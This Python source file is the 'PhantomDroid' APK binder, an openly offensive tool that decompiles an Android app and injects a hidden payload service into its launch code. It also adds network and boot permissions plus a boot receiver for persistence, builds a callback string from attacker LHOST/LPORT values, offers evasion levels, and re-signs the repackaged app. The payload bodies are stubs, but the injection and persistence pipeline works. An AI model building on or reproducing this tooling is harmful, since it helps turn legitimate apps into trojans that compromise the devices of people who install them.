#!/usr/bin/env python3
"""
PhantomDroid Framework v2.0 - APK Binder
Advanced APK payload binding with multiple injection techniques
Author: M DHARAN RAJ - Web Developer & Ethical Hacker
"""

import os
import sys
import json
import shutil
import zipfile
import tempfile
import argparse
import subprocess
from pathlib import Path
from datetime import datetime
import xml.etree.ElementTree as ET

class APKBinder:
    def __init__(self, output_dir="output", evasion_level="medium"):
        self.output_dir = Path(output_dir)
        self.evasion_level = evasion_level
        self.temp_dir = None
        
        # Create output directories
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Binding methods
        self.binding_methods = {
            "1": "smart_injection",
            "2": "resource_hijacking", 
            "3": "code_cave_injection",
            "4": "certificate_spoofing"
        }
    
    def _log(self, level, message):
        """Logging function"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def _create_temp_dir(self):
        """Create temporary working directory"""
        self.temp_dir = Path(tempfile.mkdtemp(prefix="phantom_"))
        return self.temp_dir
    
    def _cleanup_temp_dir(self):
        """Clean up temporary directory"""
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
    
    def _run_command(self, cmd, cwd=None):
        """Execute shell command"""
        try:
            result = subprocess.run(cmd, shell=True, cwd=cwd, 
                                  capture_output=True, text=True, timeout=300)
            if result.returncode != 0:
                self._log("ERROR", f"Command failed: {cmd}")
                self._log("ERROR", f"Error: {result.stderr}")
                return False, result.stderr
            return True, result.stdout
        except subprocess.TimeoutExpired:
            self._log("ERROR", f"Command timeout: {cmd}")
            return False, "Command timeout"
        except Exception as e:
            self._log("ERROR", f"Command execution error: {e}")
            return False, str(e)
    
    def decompile_apk(self, apk_path):
        """Decompile APK using apktool"""
        self._log("INFO", f"Decompiling APK: {apk_path}")
        
        apk_name = Path(apk_path).stem
        output_dir = self.temp_dir / f"{apk_name}_decompiled"
        
        cmd = f"apktool d \"{apk_path}\" -o \"{output_dir}\" -f"
        success, output = self._run_command(cmd)
        
        if success:
            self._log("SUCCESS", "APK decompiled successfully")
            return output_dir
        else:
            self._log("ERROR", f"APK decompilation failed: {output}")
            return None
    
    def analyze_apk_structure(self, decompiled_dir):
        """Analyze decompiled APK structure"""
        self._log("INFO", "Analyzing APK structure")
        
        analysis = {
            "package_name": None,
            "main_activity": None,
            "permissions": [],
            "services": [],
            "receivers": [],
            "activities": [],
            "smali_dirs": [],
            "resources": []
        }
        
        # Parse AndroidManifest.xml
        manifest_path = decompiled_dir / "AndroidManifest.xml"
        if manifest_path.exists():
            try:
                tree = ET.parse(manifest_path)
                root = tree.getroot()
                
                # Get package name
                analysis["package_name"] = root.get("package")
                
                # Get permissions
                for perm in root.findall(".//uses-permission"):
                    analysis["permissions"].append(perm.get("{http://schemas.android.com/apk/res/android}name"))
                
                # Get application components
                app = root.find("application")
                if app is not None:
                    # Activities
                    for activity in app.findall("activity"):
                        activity_name = activity.get("{http://schemas.android.com/apk/res/android}name")
                        analysis["activities"].append(activity_name)
                        
                        # Check for main activity
                        intent_filter = activity.find("intent-filter")
                        if intent_filter is not None:
                            action = intent_filter.find("action")
                            category = intent_filter.find("category")
                            if (action is not None and 
                                action.get("{http://schemas.android.com/apk/res/android}name") == "android.intent.action.MAIN" and
                                category is not None and
                                category.get("{http://schemas.android.com/apk/res/android}name") == "android.intent.category.LAUNCHER"):
                                analysis["main_activity"] = activity_name
                    
                    # Services
                    for service in app.findall("service"):
                        analysis["services"].append(service.get("{http://schemas.android.com/apk/res/android}name"))
                    
                    # Receivers
                    for receiver in app.findall("receiver"):
                        analysis["receivers"].append(receiver.get("{http://schemas.android.com/apk/res/android}name"))
                
            except Exception as e:
                self._log("ERROR", f"Manifest parsing error: {e}")
        
        # Find smali directories
        for item in decompiled_dir.iterdir():
            if item.is_dir() and item.name.startswith("smali"):
                analysis["smali_dirs"].append(item)
        
        # Find resources
        res_dir = decompiled_dir / "res"
        if res_dir.exists():
            analysis["resources"] = list(res_dir.rglob("*"))
        
        self._log("INFO", f"Package: {analysis['package_name']}")
        self._log("INFO", f"Main Activity: {analysis['main_activity']}")
        self._log("INFO", f"Smali dirs: {len(analysis['smali_dirs'])}")
        
        return analysis
    
    def smart_injection(self, decompiled_dir, analysis, payload_code):
        """Smart payload injection into existing code"""
        self._log("INFO", "Performing smart injection")
        
        # Find the main activity smali file
        main_activity = analysis["main_activity"]
        if not main_activity:
            self._log("ERROR", "No main activity found")
            return False
        
        # Convert class name to file path
        if main_activity.startswith("."):
            class_path = analysis["package_name"].replace(".", "/") + main_activity.replace(".", "/")
        else:
            class_path = main_activity.replace(".", "/")
        
        # Find the smali file
        smali_file = None
        for smali_dir in analysis["smali_dirs"]:
            potential_file = smali_dir / f"{class_path}.smali"
            if potential_file.exists():
                smali_file = potential_file
                break
        
        if not smali_file:
            self._log("ERROR", f"Main activity smali file not found: {class_path}")
            return False
        
        # Read original smali content
        with open(smali_file, 'r', encoding='utf-8') as f:
            smali_content = f.read()
        
        # Generate payload service smali
        payload_service_smali = self._generate_payload_service_smali(analysis["package_name"], payload_code)
        
        # Create payload service file
        service_name = "PhantomService"
        service_path = smali_file.parent / f"{service_name}.smali"
        with open(service_path, 'w', encoding='utf-8') as f:
            f.write(payload_service_smali)
        
        # Inject service start code into onCreate method
        injection_code = f"""
    # PhantomDroid payload injection
    new-instance v0, Landroid/content/Intent;
    
    invoke-direct {{v0}}, Landroid/content/Intent;-><init>()V
    
    const-class v1, L{analysis["package_name"].replace(".", "/")}/{service_name};
    
    invoke-virtual {{v0, p0, v1}}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
    
    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    # End payload injection
"""
        
        # Find onCreate method and inject code
        oncreate_pattern = r"\.method\s+protected\s+onCreate\(Landroid/os/Bundle;\)V"
        if "onCreate" in smali_content:
            # Simple injection after super.onCreate call
            super_oncreate = "invoke-super {p0, p1}, "
            injection_point = smali_content.find(super_oncreate)
            if injection_point != -1:
                # Find end of super.onCreate line
                line_end = smali_content.find("\n", injection_point)
                if line_end != -1:
                    # Insert injection code
                    modified_content = (smali_content[:line_end + 1] + 
                                      injection_code + 
                                      smali_content[line_end + 1:])
                    
                    # Write modified smali
                    with open(smali_file, 'w', encoding='utf-8') as f:
                        f.write(modified_content)
                    
                    self._log("SUCCESS", "Smart injection completed")
                    return True
        
        self._log("ERROR", "Failed to inject into onCreate method")
        return False
    
    def resource_hijacking(self, decompiled_dir, analysis, payload_code):
        """Resource hijacking injection method"""
        self._log("INFO", "Performing resource hijacking")
        
        # Find drawable resources to hijack
        res_dir = decompiled_dir / "res"
        drawable_dirs = [d for d in res_dir.iterdir() if d.is_dir() and d.name.startswith("drawable")]
        
        if not drawable_dirs:
            self._log("ERROR", "No drawable directories found")
            return False
        
        # Create hidden payload in resources
        payload_dir = drawable_dirs[0]
        payload_file = payload_dir / "phantom_config.xml"
        
        # Encode payload in XML resource
        payload_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="config_data">{payload_code}</string>
    <string name="phantom_active">true</string>
</resources>"""
        
        with open(payload_file, 'w', encoding='utf-8') as f:
            f.write(payload_xml)
        
        # Create resource reader service
        service_smali = self._generate_resource_reader_service(analysis["package_name"])
        
        # Add service to smali
        service_path = analysis["smali_dirs"][0] / analysis["package_name"].replace(".", "/") / "PhantomResourceService.smali"
        service_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(service_path, 'w', encoding='utf-8') as f:
            f.write(service_smali)
        
        self._log("SUCCESS", "Resource hijacking completed")
        return True
    
    def code_cave_injection(self, decompiled_dir, analysis, payload_code):
        """Code cave injection method"""
        self._log("INFO", "Performing code cave injection")
        
        # Find unused methods or create code caves
        # This is a simplified implementation
        
        # Create standalone payload class
        payload_class_smali = self._generate_standalone_payload_class(analysis["package_name"], payload_code)
        
        # Add to smali
        payload_path = analysis["smali_dirs"][0] / analysis["package_name"].replace(".", "/") / "SystemUpdate.smali"
        payload_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(payload_path, 'w', encoding='utf-8') as f:
            f.write(payload_class_smali)
        
        self._log("SUCCESS", "Code cave injection completed")
        return True
    
    def certificate_spoofing(self, decompiled_dir, analysis, payload_code):
        """Certificate spoofing method"""
        self._log("INFO", "Performing certificate spoofing")
        
        # This would involve complex certificate manipulation
        # For now, implement basic payload injection with certificate preservation
        
        return self.smart_injection(decompiled_dir, analysis, payload_code)
    
    def _generate_payload_service_smali(self, package_name, payload_code):
        """Generate payload service in smali format"""
        return f"""
.class public Lcom/phantom/PhantomService;
.super Landroid/app/Service;
.source "PhantomService.java"

# direct methods
.method public constructor <init>()V
    .locals 0
    
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    
    return-void
.end method

.method public onCreate()V
    .locals 2
    
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    
    # Start payload execution
    new-instance v0, Ljava/lang/Thread;
    
    new-instance v1, Lcom/phantom/PhantomService$PayloadRunner;
    
    invoke-direct {{v1, p0}}, Lcom/phantom/PhantomService$PayloadRunner;-><init>(Lcom/phantom/PhantomService;)V
    
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
    
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    
    const/4 v0, 0x0
    
    return-object v0
.end method

# Inner class for payload execution
.class Lcom/phantom/PhantomService$PayloadRunner;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.method public run()V
    .locals 0
    
    # Payload execution code would go here
    # This is a simplified version
    
    return-void
.end method
"""
    
    def _generate_resource_reader_service(self, package_name):
        """Generate resource reader service smali"""
        return f"""
.class public Lcom/phantom/PhantomResourceService;
.super Landroid/app/Service;

.method public onCreate()V
    .locals 0
    
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    
    # Read payload from resources and execute
    
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    
    const/4 v0, 0x0
    
    return-object v0
.end method
"""
    
    def _generate_standalone_payload_class(self, package_name, payload_code):
        """Generate standalone payload class smali"""
        return f"""
.class public Lcom/phantom/SystemUpdate;
.super Ljava/lang/Object;

.method public static execute()V
    .locals 0
    
    # Payload execution logic
    
    return-void
.end method
"""
    
    def modify_manifest(self, decompiled_dir, analysis):
        """Modify AndroidManifest.xml to include payload components"""
        self._log("INFO", "Modifying AndroidManifest.xml")
        
        manifest_path = decompiled_dir / "AndroidManifest.xml"
        
        try:
            # Read manifest
            with open(manifest_path, 'r', encoding='utf-8') as f:
                manifest_content = f.read()
            
            # Add required permissions
            required_permissions = [
                "android.permission.INTERNET",
                "android.permission.ACCESS_NETWORK_STATE",
                "android.permission.WAKE_LOCK",
                "android.permission.RECEIVE_BOOT_COMPLETED"
            ]
            
            permissions_to_add = []
            for perm in required_permissions:
                if perm not in manifest_content:
                    permissions_to_add.append(f'    <uses-permission android:name="{perm}" />')
            
            # Add permissions before application tag
            if permissions_to_add:
                app_tag_pos = manifest_content.find("<application")
                if app_tag_pos != -1:
                    manifest_content = (manifest_content[:app_tag_pos] + 
                                      "\n".join(permissions_to_add) + "\n\n    " +
                                      manifest_content[app_tag_pos:])
            
            # Add service declaration
            service_declaration = '''        <service
            android:name="com.phantom.PhantomService"
            android:enabled="true"
            android:exported="false" />
        
        <receiver
            android:name="com.phantom.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>'''
            
            # Add before closing application tag
            app_close_pos = manifest_content.rfind("</application>")
            if app_close_pos != -1:
                manifest_content = (manifest_content[:app_close_pos] + 
                                  service_declaration + "\n    " +
                                  manifest_content[app_close_pos:])
            
            # Write modified manifest
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(manifest_content)
            
            self._log("SUCCESS", "AndroidManifest.xml modified")
            return True
            
        except Exception as e:
            self._log("ERROR", f"Manifest modification failed: {e}")
            return False
    
    def recompile_apk(self, decompiled_dir, output_name):
        """Recompile APK using apktool"""
        self._log("INFO", "Recompiling APK")
        
        output_apk = self.output_dir / f"{output_name}.apk"
        
        cmd = f"apktool b \"{decompiled_dir}\" -o \"{output_apk}\""
        success, output = self._run_command(cmd)
        
        if success:
            self._log("SUCCESS", f"APK recompiled: {output_apk}")
            return output_apk
        else:
            self._log("ERROR", f"APK recompilation failed: {output}")
            return None
    
    def sign_apk(self, apk_path):
        """Sign APK with debug certificate"""
        self._log("INFO", "Signing APK")
        
        # Create debug keystore if it doesn't exist
        keystore_path = self.temp_dir / "debug.keystore"
        if not keystore_path.exists():
            cmd = f"""keytool -genkey -v -keystore "{keystore_path}" -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US" """
            success, output = self._run_command(cmd)
            if not success:
                self._log("ERROR", f"Keystore creation failed: {output}")
                return None
        
        # Sign APK
        signed_apk = apk_path.parent / f"{apk_path.stem}_signed.apk"
        cmd = f"""jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "{keystore_path}" -storepass android -keypass android "{apk_path}" androiddebugkey"""
        
        success, output = self._run_command(cmd)
        if success:
            # Copy to signed version
            shutil.copy2(apk_path, signed_apk)
            self._log("SUCCESS", f"APK signed: {signed_apk}")
            return signed_apk
        else:
            self._log("ERROR", f"APK signing failed: {output}")
            return None
    
    def bind_payload(self, apk_path, lhost, lport, method, output_name=None):
        """Main payload binding function"""
        if not Path(apk_path).exists():
            self._log("ERROR", f"APK file not found: {apk_path}")
            return None
        
        if not output_name:
            output_name = f"phantom_bound_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Create temporary directory
        self._create_temp_dir()
        
        try:
            # Decompile APK
            decompiled_dir = self.decompile_apk(apk_path)
            if not decompiled_dir:
                return None
            
            # Analyze APK structure
            analysis = self.analyze_apk_structure(decompiled_dir)
            
            # Generate payload code (simplified)
            payload_code = f"tcp://{lhost}:{lport}"
            
            # Apply binding method
            binding_method = self.binding_methods.get(str(method), "smart_injection")
            
            if binding_method == "smart_injection":
                success = self.smart_injection(decompiled_dir, analysis, payload_code)
            elif binding_method == "resource_hijacking":
                success = self.resource_hijacking(decompiled_dir, analysis, payload_code)
            elif binding_method == "code_cave_injection":
                success = self.code_cave_injection(decompiled_dir, analysis, payload_code)
            elif binding_method == "certificate_spoofing":
                success = self.certificate_spoofing(decompiled_dir, analysis, payload_code)
            else:
                self._log("ERROR", f"Unknown binding method: {binding_method}")
                return None
            
            if not success:
                self._log("ERROR", "Payload injection failed")
                return None
            
            # Modify manifest
            if not self.modify_manifest(decompiled_dir, analysis):
                self._log("WARN", "Manifest modification failed, continuing...")
            
            # Recompile APK
            recompiled_apk = self.recompile_apk(decompiled_dir, output_name)
            if not recompiled_apk:
                return None
            
            # Sign APK
            signed_apk = self.sign_apk(recompiled_apk)
            if not signed_apk:
                return None
            
            self._log("SUCCESS", f"Payload binding completed: {signed_apk}")
            return signed_apk
            
        except Exception as e:
            self._log("ERROR", f"Binding process failed: {e}")
            return None
        finally:
            # Cleanup
            self._cleanup_temp_dir()

def main():
    parser = argparse.ArgumentParser(description="PhantomDroid APK Binder")
    parser.add_argument("--apk", required=True, help="Target APK file")
    parser.add_argument("--lhost", required=True, help="Listening host IP")
    parser.add_argument("--lport", required=True, type=int, help="Listening port")
    parser.add_argument("--method", required=True, choices=["1", "2", "3", "4"],
                       help="Binding method (1=smart, 2=resource, 3=code_cave, 4=certificate)")
    parser.add_argument("--output", default="output", help="Output directory")
    parser.add_argument("--evasion", default="medium", choices=["basic", "medium", "high", "extreme"],
                       help="Evasion level")
    parser.add_argument("--name", help="Output filename")
    
    args = parser.parse_args()
    
    # Initialize binder
    binder = APKBinder(args.output, args.evasion)
    
    # Bind payload
    result = binder.bind_payload(args.apk, args.lhost, args.lport, args.method, args.name)
    
    if result:
        print(f"Bound APK created: {result}")
        sys.exit(0)
    else:
        print("APK binding failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
